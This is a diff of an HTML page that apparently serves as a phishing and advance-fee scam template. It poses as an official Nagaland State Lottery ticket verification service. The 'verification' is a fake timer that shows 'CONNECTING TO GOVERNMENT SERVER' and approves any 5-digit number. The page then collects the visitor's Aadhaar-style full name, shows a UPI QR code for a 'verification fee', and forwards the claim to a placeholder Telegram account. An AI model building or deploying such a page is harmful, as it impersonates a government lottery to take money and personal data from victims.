@@ -1,147 +1,149 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Dear Lottery Premium</title>
+    <title>Nagaland State Lottery - Official Verification</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800&display=swap" rel="stylesheet">
-    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
     <style>
-        :root { --p-green: #00897b; --p-orange: #ff6f00; --p-dark: #121212; }
+        :root { 
+            --gold: #ffb300; 
+            --emerald: #2e7d32; 
+            --bg-dark: #0a0f18;
+            --card-glass: rgba(255, 255, 255, 0.05);
+        }
         body { 
-            margin: 0; background: #0f172a; font-family: 'Poppins', sans-serif; color: white;
-            display: flex; flex-direction: column; min-height: 100vh;
+            margin: 0; background: var(--bg-dark); font-family: 'Poppins', sans-serif; color: white;
+            display: flex; flex-direction: column; min-height: 100vh; overflow-x: hidden;
         }
 
         /* Top Bar */
         .top-bar {
-            padding: 20px; background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px); display: flex; justify-content: space-between;
+            padding: 20px; background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(15px); display: flex; justify-content: space-between;
             align-items: center; border-bottom: 1px solid rgba(255,255,255,0.1);
         }
-        .logo { font-weight: 800; font-size: 22px; color: var(--p-orange); letter-spacing: 1px; }
+        .logo { font-weight: 800; font-size: 16px; color: var(--gold); letter-spacing: 1px; text-transform: uppercase; }
+        .live-tag { font-size: 10px; background: #ef5350; color: white; padding: 2px 8px; border-radius: 4px; animation: pulse 1.5s infinite; }
 
-        /* Status Card */
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+
         .container { padding: 20px; flex-grow: 1; }
+
+        /* Card Styling */
         .card {
-            background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 24px; padding: 25px; margin-bottom: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            background: var(--card-glass); border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 28px; padding: 30px; margin-bottom: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
         }
 
-        .input-group { margin: 20px 0; }
-        label { font-size: 12px; color: #94a3b8; display: block; margin-bottom: 8px; }
+        .input-group { margin: 25px 0; }
+        label { font-size: 11px; color: #94a3b8; display: block; margin-bottom: 10px; letter-spacing: 1px; }
+        
         input {
-            width: 100%; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
-            padding: 15px; border-radius: 12px; color: white; font-size: 18px; outline: none;
-            transition: 0.3s; box-sizing: border-box;
+            width: 100%; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1);
+            padding: 18px; border-radius: 16px; color: white; font-size: 18px; outline: none;
+            box-sizing: border-box; text-align: center;
         }
-        input:focus { border-color: var(--p-orange); background: rgba(255,255,255,0.1); }
+        input:focus { border-color: var(--gold); }
 
         .btn-main {
-            width: 100%; background: linear-gradient(90deg, #ff8f00, #ff6f00);
-            color: white; border: none; padding: 18px; border-radius: 14px;
-            font-weight: 700; font-size: 16px; cursor: pointer; text-transform: uppercase;
-            box-shadow: 0 4px 15px rgba(255, 111, 0, 0.3); transition: 0.2s;
+            width: 100%; background: linear-gradient(135deg, #ffb300, #ff8f00);
+            color: #000; border: none; padding: 20px; border-radius: 18px;
+            font-weight: 800; font-size: 16px; cursor: pointer; text-transform: uppercase;
         }
-        .btn-main:active { transform: scale(0.98); opacity: 0.9; }
 
-        /* Loader Animation */
-        #verify-loader { display: none; text-align: center; margin-top: 20px; }
-        .dots { display: inline-block; width: 8px; height: 8px; background: var(--p-orange); border-radius: 50%; margin: 2px; animation: bounce 0.5s infinite alternate; }
-        .dots:nth-child(2) { animation-delay: 0.1s; }
-        .dots:nth-child(3) { animation-delay: 0.2s; }
-        @keyframes bounce { to { transform: translateY(-10px); opacity: 0.3; } }
+        /* Scanner Section */
+        .qr-section { text-align: center; margin-top: 15px; }
+        .qr-code { 
+            width: 200px; height: 200px; background: white; 
+            padding: 10px; border-radius: 12px; margin: 15px auto;
+            border: 4px solid var(--gold);
+        }
 
-        /* Bottom Menu */
+        #loader { display: none; text-align: center; margin: 20px 0; }
+        .spinner { width: 30px; height: 30px; border: 3px solid rgba(255,179,0,0.2); border-top: 3px solid var(--gold); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
         .nav-bar {
-            background: #1e293b; padding: 12px 0; display: flex; justify-content: space-around;
-            border-top: 1px solid rgba(255,255,255,0.05); position: sticky; bottom: 0;
+            background: rgba(10, 15, 24, 0.9); padding: 15px 0; display: flex; 
+            justify-content: space-around; border-top: 1px solid rgba(255,255,255,0.05);
         }
-        .nav-item { text-align: center; color: #64748b; font-size: 11px; text-decoration: none; width: 20%; }
-        .nav-item.active { color: var(--p-orange); }
-        .nav-item svg { width: 22px; height: 22px; margin-bottom: 4px; display: block; margin-left: auto; margin-right: auto; }
+        .nav-item { color: #475569; font-size: 11px; text-decoration: none; font-weight: bold; }
+        .nav-item.active { color: var(--gold); }
     </style>
 </head>
 <body>
 
     <div class="top-bar">
-        <div class="logo">DEAR ADMIN</div>
-        <div style="font-size: 12px; background: rgba(0,255,0,0.1); color: #4ade80; padding: 4px 10px; border-radius: 20px;">Live Server</div>
+        <div class="logo">NAGALAND STATE LOTTERY</div>
+        <div class="live-tag">● LIVE</div>
     </div>
 
     <div class="container">
-        <div class="card" id="view-1">
-            <h2 style="margin: 0 0 10px; font-weight: 800;">Ticket Check</h2>
-            <p style="color: #94a3b8; font-size: 13px;">Asli ticket verify karne ke liye number darj karein.</p>
+        <div class="card" id="step-1">
+            <h2 style="margin: 0; font-weight: 800;">Ticket Check</h2>
+            <p style="color: #64748b; font-size: 13px;">Please enter your ticket number for official verification.</p>
             
             <div class="input-group">
                 <label>TICKET NUMBER (5 DIGITS)</label>
-                <input type="number" id="t-num" placeholder="0 0 0 0 0">
+                <input type="number" id="ticket-id" placeholder="0 0 0 0 0">
             </div>
 
-            <button class="btn-main" onclick="startVerify()">Verify Ticket Now</button>
+            <button class="btn-main" onclick="processVerify()">Verify Now</button>
 
-            <div id="verify-loader">
-                <div class="dots"></div><div class="dots"></div><div class="dots"></div>
-                <p style="font-size: 11px; color: #64748b;">DATABASE MATCHING...</p>
+            <div id="loader">
+                <div class="spinner"></div>
+                <p style="font-size: 11px; color: #64748b; margin-top: 10px;">CONNECTING TO GOVERNMENT SERVER...</p>
             </div>
         </div>
 
-        <div class="card" id="view-2" style="display: none; border-color: #4ade80;">
-            <div style="text-align: center; margin-bottom: 20px;">
-                <div style="background: #4ade80; width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto;">
-                    <svg viewBox="0 0 24 24" width="30" height="30" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
-                </div>
-                <h2 style="color: #4ade80;">Ticket Verified!</h2>
+        <div class="card" id="step-2" style="display: none;">
+            <div style="text-align: center; color: #4ade80; margin-bottom: 20px;">
+                <h2 style="margin:0;">✓ TICKET VERIFIED</h2>
+                <p style="color: #94a3b8; font-size: 12px;">Complete registration to claim prize.</p>
             </div>
             
             <div class="input-group">
-                <label>CUSTOMER NAME</label>
-                <input type="text" id="c-name" placeholder="John Doe">
-            </div>
-            <div class="input-group">
-                <label>MOBILE NUMBER</label>
-                <input type="number" id="c-phone" placeholder="+91 XXXX XXXX">
+                <label>FULL NAME</label>
+                <input type="text" id="user-name" placeholder="As per Aadhaar">
             </div>
             
-            <button class="btn-main" style="background: #4ade80;" onclick="goToPayment()">Confirm & Proceed</button>
+            <div class="qr-section">
+                <p style="font-size: 13px; color: var(--gold); font-weight: bold;">SCAN TO PAY VERIFICATION FEE</p>
+                <img src="YOUR_SCANNER_IMAGE_LINK_HERE" class="qr-code" alt="UPI Scanner">
+                <p style="font-size: 11px; color: #94a3b8;">After payment, click the button below to send screenshot.</p>
+            </div>
+            
+            <button class="btn-main" style="background: var(--emerald); color: white; margin-top: 20px;" onclick="sendToAdmin()">Submit to Official</button>
         </div>
     </div>
 
     <nav class="nav-bar">
-        <a href="#" class="nav-item active">
-            <svg fill="currentColor" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
-            Home
-        </a>
-        <a href="admin.html" class="nav-item">
-            <svg fill="currentColor" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
-            Admin
-        </a>
+        <a href="#" class="nav-item active">HOME</a>
+        <a href="admin.html" class="nav-item">ADMIN</a>
     </nav>
 
     <script>
-        function startVerify() {
-            let num = document.getElementById('t-num').value;
-            if(num.length < 5) { alert("Sahi number bharein!"); return; }
+        function processVerify() {
+            const t = document.getElementById('ticket-id').value;
+            if(t.length < 5) { alert("Please enter a valid 5-digit number."); return; }
             
-            document.getElementById('verify-loader').style.display = 'block';
+            document.getElementById('loader').style.display = 'block';
             
             setTimeout(() => {
-                document.getElementById('view-1').style.display = 'none';
-                document.getElementById('view-2').style.display = 'block';
+                document.getElementById('step-1').style.display = 'none';
+                document.getElementById('step-2').style.display = 'block';
             }, 2500);
         }
 
-        function goToPayment() {
-            let n = document.getElementById('c-name').value;
-            let p = document.getElementById('c-phone').value;
-            let t = document.getElementById('t-num').value;
-            if(!n || !p) { alert("Details bharein"); return; }
-            
-            // Redirect to Payment/Telegram
-            let text = `Verification_Success!%0AName: ${n}%0APhone: ${p}%0ATicket: ${t}`;
-            window.location.href = `https://t.me/Aapka_Username?text=${text}`;
+        function sendToAdmin() {
+            const n = document.getElementById('user-name').value;
+            const t = document.getElementById('ticket-id').value;
+            if(!n) { alert("Please enter your name."); return; }
+
+            const msg = `OFFICIAL_CLAIM_REQUEST%0AName: ${n}%0ATicket: ${t}%0AStatus: Payment_Done`;
+            window.location.href = `https://t.me/YOUR_USERNAME?text=${msg}`;
         }
     </script>
 </body>
